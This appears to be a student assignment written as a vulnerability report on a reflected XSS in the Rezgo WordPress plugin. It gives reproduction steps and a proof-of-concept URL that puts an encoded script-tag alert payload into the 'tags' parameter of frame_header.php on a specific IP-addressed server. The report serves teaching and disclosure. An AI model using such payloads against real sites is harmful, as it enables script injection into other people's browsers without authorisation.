# cs-assignment

## Title: 
Reflected XSS at http://143.198.175.81/pertemuan9 via rezgo plugin parameter

## Summary

An issue on rezgo plugin regarding XSS attack, so attacker can inject dangeroues script on some parameters. The plugin does not sanitise and escape some parameters before outputting them back in a page, leading to a Reflected Cross-Site Scripting, which can be exploited either via a LFI in an AJAX action, or direct call to the affected file

## Step To Reproduce

1. Go to website http://143.198.175.81/pertemuan9
2. Direct call http://143.198.175.81/pertemuan9/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%22%3E%3Cscript%3Ealert(`xss`)%3C/script%3E
3. XSS Reflected

## Proof Of Concept

Direct call: http://143.198.175.81/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%22%3E%3Cscript%3Ealert(`xss`)%3C/script%3E

![image](https://user-images.githubusercontent.com/6330046/191037575-4746ac50-5af0-4db2-9ff4-8683508eb755.png)

## Impact 

Attacker can inject dangeroues script on some parameters

## Remediate

sanitise and escape some parameters before outputting them back in a page







